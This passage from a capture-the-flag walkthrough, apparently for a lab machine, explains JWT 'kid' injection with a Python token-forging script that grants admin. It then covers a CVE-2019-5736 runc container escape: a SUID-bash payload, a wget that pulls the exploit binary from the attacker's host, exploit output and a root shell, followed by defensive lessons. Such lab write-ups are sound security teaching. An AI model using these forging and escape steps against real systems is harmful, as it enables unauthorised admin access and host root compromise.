<h2 id="phase-3-jwt-theory-and-the-kid-injection">Phase 3: JWT Theory &amp; The <code>kid</code> Injection</h2>
<h3 id="decoding-the-jwt">Decoding the JWT</h3>
<p>Using <a href="https://jwt.io" target="_blank" rel="nofollow noopener noreferrer">jwt.io<span class="sr-only"> opens in a new tab</span></a> or Python, we decode the token:</p>
<p><strong>Header:</strong></p>
<pre><code class="language-json" data-language="json">{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
</code></pre>
<p><strong>Payload:</strong></p>
<pre><code class="language-json" data-language="json">{
  "username": "testuser",
  "email": "test@test.test",
  "admin_cap": 0
}
</code></pre>
<h3 id="understanding-jwts">Understanding JWTs</h3>
<p><strong>What is RS256?</strong> It's RSA-with-SHA256, an <strong>asymmetric</strong> algorithm. The server signs the token with a <strong>private key</strong>, and anyone can verify it with the corresponding <strong>public key</strong>.</p>
<p><strong>What is <code>kid</code>?</strong> The "Key ID" header parameter tells the server WHICH key to use for verification. It's supposed to be an internal identifier (like "key-1" or "prod-signing-key").</p>
<p><strong>Why is this <code>kid</code> suspicious?</strong> 
Instead of an internal identifier, it's a <strong>full URL</strong>: <code>http://localhost:7070/privKey.key</code></p>
<p>This means the server is <strong>dynamically fetching the verification key from a URL</strong> every time it validates a token. That's not how <code>kid</code> is supposed to work - <code>kid</code> should map to a pre-configured key in a local store (database, file system, etc.).</p>
<p><strong>The vulnerability:</strong> If the server fetches the verification key from an arbitrary URL specified in the JWT header, we can change that URL to point to a key WE control. This is called <strong>JWT Key ID (<code>kid</code>) Injection</strong> or <strong>JWT Key Confusion via <code>kid</code></strong>.</p>
<p><strong>Why does this work?</strong></p>
<ol>
<li>We generate our own RSA key pair</li>
<li>We sign a forged JWT with our private key</li>
<li>We set <code>kid</code> to point to our server: <code>http://10.10.16.84:7070/privKey.key</code></li>
<li>The target server fetches our key from our server</li>
<li>The target verifies our signature against our key → validation passes</li>
<li>The target trusts the payload → we become admin</li>
</ol>
<p><strong>The "admin_cap" field:</strong> This is a custom claim in the payload. <code>0</code> = regular user, <code>1</code> = admin. By changing this to <code>1</code>, the application will treat us as an administrator.</p>

<h2 id="phase-4-forging-admin-access">Phase 4: Forging Admin Access</h2>
<h3 id="step-by-step-exploitation">Step-by-Step Exploitation</h3>
<h4 id="1-generate-our-own-rsa-private-key">1. Generate our own RSA private key</h4>
<pre><code class="language-bash" data-language="bash">openssl genrsa -out privKey.key 2048
</code></pre>
<p><strong>Why generate a key?</strong> We need to sign our forged JWT with a private key. The server will then fetch the corresponding public key (or in this case, the private key file itself) from our server to verify the signature.</p>
<h4 id="2-host-the-key">2. Host the key</h4>
<pre><code class="language-bash" data-language="bash">python3 -m http.server 7070
</code></pre>
<p><strong>Why host it?</strong> The <code>kid</code> URL must be accessible from the target server. By running a simple Python HTTP server, we can serve our key file.</p>
<h4 id="3-forge-the-jwt">3. Forge the JWT</h4>
<p>We used a Python script to create the forged token:</p>
<pre><code class="language-python" data-language="python">import jwt

private_key = open('privKey.key', 'r').read()

headers = {
    "typ": "JWT",
    "alg": "RS256",
    "kid": "http://10.10.16.84:7070/privKey.key"
}

payload = {
    "username": "testuser",
    "email": "test@test.test",
    "admin_cap": 1
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(token)
</code></pre>
<p><strong>What changed?</strong></p>
<ul>
<li><code>kid</code>: Changed from <code>localhost:7070</code> to our Kali IP <code>10.10.16.84:7070</code></li>
<li><code>admin_cap</code>: Changed from <code>0</code> to <code>1</code></li>
<li>Signed with OUR private key instead of the server's</li>
</ul>
<h4 id="4-replace-the-cookie-and-access-admin">4. Replace the cookie and access /admin</h4>
<ul>
<li>Open browser DevTools → Application → Cookies</li>
<li>Replace the <code>auth</code> cookie with the forged token</li>
<li>Visit <code>http://10.129.13.33/admin</code></li>
</ul>
<p><strong>What happened?</strong> The target server made an HTTP request to our Kali machine at <code>10.10.16.84:7070/privKey.key</code>, fetched our key, verified the signature, saw <code>admin_cap: 1</code>, and granted us admin access.</p>

<p><strong>Why does the server trust our key?</strong> Because the developer made a critical mistake: they allowed the <code>kid</code> parameter to contain an arbitrary URL and didn't validate it against a whitelist. In a secure application, the server should only use pre-configured keys from trusted sources, never fetch keys from user-supplied URLs.</p>
<p><strong>What if it didn't work?</strong> Common failure points:</p>
<ul>
<li>Wrong IP in <code>kid</code> (must be reachable from target)</li>
<li>HTTP server not running or blocked by firewall</li>
<li>Wrong key file being served (must match the signing key)</li>
<li>The server might require <code>https://</code> instead of <code>http://</code></li>
</ul>

<h2 id="phase-9-cve-2019-5736-theory-of-the-runc-escape">Phase 9: CVE-2019-5736: Theory of the Runc Escape</h2>
<h3 id="what-is-runc">What is runc?</h3>
<p><strong>Runc</strong> is the low-level container runtime that Docker uses under the hood. When you run <code>docker exec</code>, Docker calls runc to actually start the process inside the container. Runc is a small, privileged binary that runs as <strong>root</strong> on the host.</p>
<h3 id="the-vulnerability">The Vulnerability</h3>
<p>CVE-2019-5736 is a critical vulnerability in runc (affecting versions before 1.0.0-rc7, used by Docker before 18.09.2). It allows an attacker with <strong>root access inside a container</strong> to overwrite the host's runc binary.</p>
<h3 id="how-the-attack-works">How the Attack Works</h3>
<ol>
<li><strong>Overwrite <code>/bin/sh</code> inside the container</strong> with a symlink to <code>/proc/self/exe</code></li>
<li><strong>Wait for someone to run <code>docker exec</code></strong> on the host</li>
<li>When runc tries to execute <code>/bin/sh</code> inside the container, it follows the symlink to <code>/proc/self/exe</code> : which points to the <strong>runc binary itself</strong> on the host</li>
<li><strong>Runc opens itself</strong> (its own binary) to read/execute it</li>
<li>The attacker finds the PID of this runc process and opens <code>/proc/[pid]/exe</code> for writing</li>
<li>The attacker <strong>overwrites the runc binary on the host</strong> with a malicious payload</li>
<li>The next time anyone runs <code>docker exec</code>, the <strong>malicious payload executes as root on the host</strong></li>
</ol>

<p><strong>Why does this work?</strong> It's a race condition combined with a confused deputy problem:</p>
<ul>
<li><code>/proc/self/exe</code> is a special symlink that points to the currently running executable</li>
<li>When runc executes <code>/bin/sh</code> (which is a symlink to <code>/proc/self/exe</code>), runc ends up executing <strong>itself</strong></li>
<li>While runc has its own binary open, the container's root can write to that same file through <code>/proc/[pid]/exe</code></li>
<li>Since runc is owned by root on the host, overwriting it gives us persistent root code execution</li>
</ul>
<p><strong>Why is this so dangerous?</strong> Because containers are supposed to be isolated. This vulnerability breaks that isolation completely - a container escape leads directly to host root access.</p>

<h2 id="phase-10-exploitation-container-breakout">Phase 10: Exploitation: Container Breakout</h2>
<h3 id="step-1-build-the-exploit">Step 1: Build the Exploit</h3>
<p>We downloaded the Go PoC from <a href="https://github.com/Frichetten/CVE-2019-5736-PoC" target="_blank" rel="nofollow noopener noreferrer">Frichetten/CVE-2019-5736-PoC<span class="sr-only"> opens in a new tab</span></a>.</p>
<p><strong>The payload we used:</strong></p>
<pre><code class="language-go" data-language="go">var payload = "#!/bin/bash \n chmod u+s /bin/bash"
</code></pre>
<p>This makes <code>/bin/bash</code> on the host SUID root, meaning anyone can run <code>bash -p</code> to get a root shell.</p>
<p><strong>Why SUID bash instead of SSH keys?</strong> Our first attempt tried to write an SSH key to <code>/root/.ssh/authorized_keys</code>, but the exploit's race condition failed to complete the write. The SUID approach is more reliable because:</p>
<ul>
<li>It doesn't depend on <code>.ssh</code> directory existing or having correct permissions</li>
<li>It doesn't depend on SSH configuration</li>
<li>A single <code>chmod</code> system call is simpler than writing to a file</li>
</ul>
<p><strong>Cross-compilation issue:</strong> Our Kali was ARM64, but the target is x86_64. We installed the official Go compiler and cross-compiled:</p>
<pre><code class="language-bash" data-language="bash">export PATH=/usr/local/go/bin:$PATH
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o cve-2019-5736 cve-2019-5736.go
</code></pre>
<h3 id="step-2-two-session-attack">Step 2: Two-Session Attack</h3>
<p><strong>Session 1 - Inside the container:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
cd /tmp
wget 10.10.16.84:8080/cve-2019-5736 -O cve-2019-5736

./cve-2019-5736
</code></pre>
<p>Output:</p>
<pre><code>[+] Overwritten /bin/sh successfully
[+] Found the PID: 122
[+] Successfully got the file handle
[+] Successfully got the write handle &amp;{0xc0004349c0}

</code></pre>
<p><strong>Session 2 - Trigger on the host:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
# Output: No help topic for '/bin/sh'
</code></pre>

<p><strong>Why two sessions?</strong> The exploit needs a trigger. Session 1 sets the trap (overwrites <code>/bin/sh</code>), then waits. Session 2 springs the trap by running <code>docker exec</code>, which causes runc to execute and open itself. The exploit in Session 1 detects this and overwrites runc.</p>
<p><strong>Why does the trigger show a weird error?</strong> Because <code>/bin/sh</code> has been overwritten with a symlink to <code>/proc/self/exe</code>. When runc tries to execute it, it's actually trying to execute itself with <code>/bin/sh</code> as an argument. Runc doesn't understand this, hence the bizarre error message - but the exploit has already fired by this point.</p>

<h2 id="phase-11-root-access">Phase 11: Root Access</h2>
<h3 id="the-payoff">The Payoff</h3>
<p>In Session 2 (as noah on the host):</p>
<pre><code class="language-bash" data-language="bash">bash -p
whoami
# root
id
# uid=1000(noah) gid=1000(noah) euid=0(root) groups=1000(noah)
cat /root/root.txt
# 513fcaf[redacted]63ff500d5
</code></pre>

<p><strong>Why <code>bash -p</code>?</strong> The <code>-p</code> flag tells bash to run with privileged mode, preserving the effective UID. Since <code>/bin/bash</code> is now SUID root, running <code>bash -p</code> gives us a root shell while keeping our noah identity for file ownership purposes.</p>
<p><strong>Why didn't we need a password?</strong> The SUID bit bypasses all password checks. The binary runs with the permissions of its owner (root), not the user who launched it. This is a classic Unix privilege escalation technique.</p>
<hr>
<h2 id="phase-12-key-points">Phase 12: Key points</h2>
<h3 id="1-follow-the-hints">1. Follow the Hints</h3>
<p>The box creator left explicit hints:</p>
<ul>
<li>The JWT cookie with <code>kid</code> pointing to a URL</li>
<li>The admin note saying "PHP files are being executed"</li>
<li>The admin note about "regular backups"</li>
</ul>
<p><strong>Lesson:</strong> read everything. Notes, error messages, source code comments - they often contain the path forward.</p>
<h3 id="2-understand-the-technology-stack">2. Understand the Technology Stack</h3>
<p>We didn't just blindly exploit JWT - we understood:</p>
<ul>
<li>How RS256 signing works (asymmetric cryptography)</li>
<li>How <code>kid</code> is supposed to work vs. how it was misused</li>
<li>How nginx proxies requests differently based on file extension</li>
<li>How Docker and runc interact</li>
</ul>
<p><strong>Lesson:</strong> The more you understand the underlying technology, the faster you can identify misconfigurations.</p>
<h3 id="3-layered-security-failures">3. Layered Security Failures</h3>
<p>This box is a chain of failures:</p>
<ol>
<li>JWT <code>kid</code> accepts arbitrary URLs → admin access</li>
<li>Admin file upload doesn't validate file type properly → web shell</li>
<li>PHP execution on host (not container) → direct host access</li>
<li>World-readable backups → SSH key exposure</li>
<li>Outdated Docker → container escape</li>
<li>Container escape → host root</li>
</ol>
<p><strong>Lesson:</strong> Real-world security is about chains. Breaking any one link stops the attack. As a defender, fix the weakest links first. As an attacker, find the chain.</p>
<h3 id="4-container-security-is-host-security">4. Container Security is Host Security</h3>
<p>Containers are NOT security boundaries by themselves. If a container runs as privileged, has dangerous capabilities, or the runtime is vulnerable, the host is compromised.</p>
<p><strong>Lesson:</strong> Do not run outdated container runtimes in production. CVE-2019-5736 was patched in 2019 - this box simulated what happens when you don't patch.</p>
<h3 id="5-persistence-vs-one-shot">5. Persistence vs. One-Shot</h3>
<p>Our first payload (SSH key) would have given persistent access even if the shell died. The SUID bash is also persistent. think about:</p>
<ul>
<li>How do I maintain access?</li>
<li>How do I get back in if this shell dies?</li>
<li>What evidence am I leaving behind?</li>
</ul>
